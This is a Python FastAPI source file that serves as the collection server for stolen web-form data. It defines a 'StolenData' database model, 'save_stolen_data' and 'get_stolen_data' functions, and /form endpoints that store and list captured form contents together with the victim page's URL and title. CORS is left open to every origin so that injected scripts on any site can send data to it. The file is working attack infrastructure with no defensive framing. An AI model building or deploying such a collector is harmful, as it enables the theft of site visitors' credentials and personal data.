from typing import Union

from fastapi import FastAPI,Depends

from pydantic import BaseModel

from fastapi.middleware.cors import CORSMiddleware

from sqlalchemy.orm import Session

from .database import SessionLocal, engine

from . import models

app = FastAPI()


app.add_middleware(
    CORSMiddleware,
    allow_origins=['*'],
    allow_credentials=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

models.Base.metadata.create_all(bind=engine)

def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()


class Source(BaseModel):
    title: str
    url: str
    source_code: str | None = None


class FormData(BaseModel):
    source: Source
    form_data: str
    
    




# STOLEN DATA CRUD

def save_stolen_data(db: Session,form_data: FormData):
    stolen_data = models.StolenData(url=form_data.source.url,title=form_data.source.title,form_data=form_data.form_data)
    db.add(stolen_data)
    db.commit()
    db.refresh(stolen_data)
    return stolen_data


def get_stolen_data(db: Session):
    return db.query(models.StolenData).all()


@app.get("/")
def read_root():
    return {"Hello": "World"}


@app.post("/source")
def read_item(source: Source):
    print(source)
    return source


@app.post("/form")
def form_data(form_data: FormData, db: Session = Depends(get_db)):
    print(form_data)
    return save_stolen_data(db=db,form_data=form_data)

@app.get("/form")
def read_form_data(db: Session = Depends(get_db)):
    return get_stolen_data(db=db)

